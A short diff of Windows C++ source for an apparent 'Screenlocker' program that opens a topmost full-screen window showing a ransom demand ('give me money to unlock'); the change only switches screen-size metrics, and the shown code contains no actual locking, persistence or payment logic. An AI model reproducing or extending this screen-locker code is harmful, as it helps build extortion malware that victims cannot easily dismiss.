@@ -27,7 +27,7 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance,
 	}
 
 	hWnd = CreateWindowExA(WS_EX_WINDOWEDGE | WS_EX_TOPMOST, className, className, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX, 0, 0,
-		GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN), nullptr, nullptr, hInstance, nullptr);
+		GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInstance, nullptr);
 	if (hWnd == nullptr)
 	{
 		MessageBoxA(nullptr, "Failed creating main window!", "Error", MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL);
@@ -40,12 +40,12 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance,
 	hFont = CreateFontW(100, 100, 100, 100, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
 		DEFAULT_PITCH | FF_SWISS, L"Arial");
 
-	hTitle = CreateWindowExA(0, "STATIC", "Screenlocker", WS_CHILD | WS_VISIBLE, 900, 0, GetSystemMetrics(SM_CXVIRTUALSCREEN),
+	hTitle = CreateWindowExA(0, "STATIC", "Screenlocker", WS_CHILD | WS_VISIBLE, 900, 0, GetSystemMetrics(SM_CXSCREEN),
 		120, hWnd, nullptr, nullptr, nullptr);
 	SendMessageW(hTitle, WM_SETFONT, WPARAM(hNormalFont), TRUE);
 
 	hTitle = CreateWindowExA(0, "STATIC", "You're PC got a Screenlock malware give me money to unlock", WS_CHILD | WS_VISIBLE, 800, 300,
-		GetSystemMetrics(SM_CXVIRTUALSCREEN),
+		GetSystemMetrics(SM_CXSCREEN),
 		120, hWnd, nullptr, nullptr, nullptr);
 	SendMessageW(hDescription, WM_SETFONT, WPARAM(hNormalFont), TRUE);
 
